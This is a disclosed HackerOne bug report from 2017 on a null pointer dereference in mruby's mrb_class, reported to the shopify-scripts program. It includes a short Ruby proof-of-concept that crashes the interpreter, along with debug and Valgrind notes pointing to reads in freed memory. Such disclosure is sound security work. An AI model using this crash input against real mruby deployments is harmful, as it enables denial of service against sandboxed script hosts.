# Null pointer dereference in mrb_class

## Report Details
- **Report ID**: 215891
- **URL**: https://hackerone.com/reports/215891
- **State**: Closed
- **Severity**: low
- **Submitted**: 2017-03-24T17:27:15.239Z
- **Disclosed**: 2017-04-15T14:45:08.039Z

## Reporter
- **Username**: dgaletic
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
PoC
===
The following demonstrates a crash:

    if def class
      A
      ensure
        e rescue 0
      end
    end
    [].map.a

Debug info
==========
The crash happens due to a null pointer dereference in `mrb_class`, class.h:50.

    50├>    return mrb_obj_ptr(v)->c;
    
Valgrind shows several reads inside free'd blocks.


Test platform
=============
* Linux Mint 17.3 (Cinnamon 64-bit), built with gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.3

mruby SHA: 051e40c0493f2de332f5439e3230c9fe6958bf1a

Thank you,
Dinko Galetic
Denis Kasak

## Attachments
No attachments
